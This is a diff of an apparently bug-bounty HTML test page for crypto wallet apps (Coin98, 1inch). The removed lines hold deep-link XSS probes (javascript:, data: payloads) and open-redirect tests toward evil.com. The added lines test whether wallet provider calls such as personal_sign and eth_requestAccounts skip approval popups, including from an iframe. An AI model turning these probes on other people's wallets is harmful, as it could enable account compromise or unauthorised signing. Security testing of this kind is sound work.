@@ -1,73 +1,76 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Coin98 iOS Fuzzer - Ethical</title>
+<title>JS Bridge Tester - Ethical</title>
 <style>
- body{background:#000;color:#fff;font-family:-apple-system;padding:16px}
- button{width:100%;padding:14px;margin:7px 0;background:#1c1c1e;color:#fff;border:1px solid #333;border-radius:12px;text-align:left;font-size:13px}
-.p1{border-left:4px solid #ff3b30}.p2{border-left:4px solid #ffcc00}
- h3{margin-top:26px;font-size:14px;color:#aaa}
- #log{margin-top:20px;background:#111;padding:12px;border-radius:10px;word-break:break-all;font-size:11px;color:#0f0}
+ body{background:#0c0c0c;color:#fff;font-family:monospace;padding:15px;font-size:12px}
+ button{width:100%;padding:12px;margin:6px 0;background:#1e1e1e;color:#fff;border:1px solid #333;border-radius:8px;text-align:left}
+ pre{background:#111;padding:10px;border-radius:8px;overflow:auto;color:#0f0}
+.ok{color:#0f0}.fail{color:#ff3b30}
 </style>
 </head>
 <body>
+<h3>Wallet JS Bridge Tester (Buka DI DALAM Wallet)</h3>
+<p style="color:#888">Buka file ini di dalam DApp Browser 1inch / Coin98, bukan di Chrome.</p>
 
-<h2>Coin98 iOS Fuzzer</h2>
-<p style="color:#888;font-size:11px">Test khusus Coin98 Super Wallet iOS. Hanya di device sendiri.</p>
+<div id="info"></div>
 
-<h3>Pilih Scheme Coin98 (coba satu-satu)</h3>
-<select id="scheme" style="width:100%;padding:12px;background:#222;color:#fff;border-radius:10px;border:1px solid #333">
-  <option value="coin98://open?url=">coin98://open?url= (paling sering work)</option>
-  <option value="coin98://browser?url=">coin98://browser?url=</option>
-  <option value="coin98://dapp?url=">coin98://dapp?url=</option>
-  <option value="c98://open?url=">c98://open?url= (alias)</option>
-</select>
+<h4>1. Deteksi Provider</h4>
+<button onclick="detect()">[1] Cek window.ethereum / coin98 / trust</button>
+<pre id="log1">-</pre>
 
-<h3>[P1] XSS - kalau alert muncul di dalam Coin98 = P1</h3>
-<button class="p1" onclick="go('javascript:alert(document.domain)')">[P1-1] javascript:alert(domain)</button>
-<button class="p1" onclick="go('javascript:alert(1)')">[P1-2] javascript:alert(1)</button>
-<button class="p1" onclick="go('data:text/html,<script>alert(1)</script>')">[P1-3] data:text/html</button>
-<button class="p1" onclick="go('data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==')">[P1-4] data base64</button>
+<h4>2. Test eth_accounts (harus ada popup / return address)</h4>
+<button onclick="testAccounts()">[2] ethereum.request eth_accounts</button>
+<pre id="log2">-</pre>
 
-<h3>[P2] Open Redirect - harusnya ada warning</h3>
-<button class="p2" onclick="go('https://evil.com')">[P2-1] evil.com</button>
-<button class="p2" onclick="go('https://app.1inch.io@evil.com')">[P2-2] @ trick</button>
-<button class="p2" onclick="go('https://coin98.com@evil.com')">[P2-3] @ coin98.com</button>
+<h4>3. Test eth_requestAccounts (harus ada popup)</h4>
+<button onclick="testRequest()">[3] eth_requestAccounts - HARUS ADA POPUP</button>
+<pre id="log3">-</pre>
 
-<h3>[INFO] Normal</h3>
-<button onclick="go('https://app.1inch.io')">[OK] Buka 1inch di Coin98</button>
-<button onclick="go('https://coin98.com')">[OK] Buka coin98.com</button>
+<h4>4. Test personal_sign (PENTING - HARUS ADA POPUP MERAH)</h4>
+<button onclick="testSign()">[4] personal_sign - HARUS ADA POPUP, kalau langsung sign = P1 BUG</button>
+<pre id="log4">-</pre>
 
-<div id="log">Ready. Buka dari Safari iOS.</div>
+<h4>5. Test iframe bypass (sering jebol)</h4>
+<button onclick="testIframe()">[5] Coba sign dari iframe - HARUS DIBLOKIR</button>
+<pre id="log5">-</pre>
 
 <script>
-function go(payload){
-  const scheme = document.getElementById('scheme').value;
-  const encoded = encodeURIComponent(payload);
-  const deeplink = scheme + encoded;
+function log(id, msg){ document.getElementById(id).innerText = msg; }
 
-  document.getElementById('log').innerText = "Trying: " + deeplink;
-  window.location.href = deeplink;
-
-  setTimeout(()=>{
-    if(document.hasFocus()){
-      document.getElementById('log').innerText += "\n-> Gagal / diblokir. Coba ganti scheme di atas.";
-    }
-  }, 2000);
+function detect(){
+  let out = "";
+  out += "ethereum: " + (!!window.ethereum) + "\n";
+  out += "isOneInch: " + (window.ethereum?.isOneInch) + "\n";
+  out += "isCoin98: " + (!!window.coin98) + "\n";
+  out += "isTrust: " + (window.ethereum?.isTrust) + "\n";
+  out += "isMetaMask: " + (window.ethereum?.isMetaMask) + "\n";
+  out += "\nMethods:\n";
+  out += JSON.stringify(Object.keys(window.ethereum || {}), null, 2);
+  log('log1', out);
 }
-</script>
 
-<div style="margin-top:25px;padding:12px;background:#1c1c1e;border-radius:10px">
-<b style="font-size:11px">CARA TEST COIN98 iOS:</b>
-<p style="font-size:11px;color:#888;line-height:1.4">
-1. Buka halaman ini di Safari iPhone.<br>
-2. Ganti scheme di dropdown kalau gak mental. Biasanya yang work di Coin98 iOS itu <b>coin98://open?url=</b><br>
-3. Klik P1-1. Kalau di dalam browser Coin98 muncul alert = XSS P1.<br>
-4. Klik P2-1. Kalau langsung buka evil.com tanpa warning interstitial = Open Redirect.<br>
-</p>
-</div>
+async function testAccounts(){
+  try{
+    const acc = await window.ethereum.request({method:'eth_accounts'});
+    log('log2', "Returned: " + JSON.stringify(acc) + "\n-> Ini normal kalau sudah connect");
+  }catch(e){ log('log2', "Error (aman): " + e.message); }
+}
 
-</body>
-</html>
+async function testRequest(){
+  try{
+    const acc = await window.ethereum.request({method:'eth_requestAccounts'});
+    log('log3', "Returned: " + JSON.stringify(acc) + "\n-> CEK: Apakah ada popup Approve tadi? Kalau tidak ada popup tapi langsung return = BUG P1");
+  }catch(e){ log('log3', "Error / User rejected (aman): " + e.message); }
+}
+
+async function testSign(){
+  try{
+    const accounts = await window.ethereum.request({method:'eth_accounts'});
+    if(!accounts[0]){ log('log4', "Connect dulu pakai tombol [3]"); return; }
+    const msg = "Bug Bounty Test - " + Date.now();
+    const hexMsg = "0x" + [...msg].map(c=>c.charCodeAt(0).toString(16).padStart(2,'0')).join('');
+
+    log('log4', "Mencoba sign...\nHAR
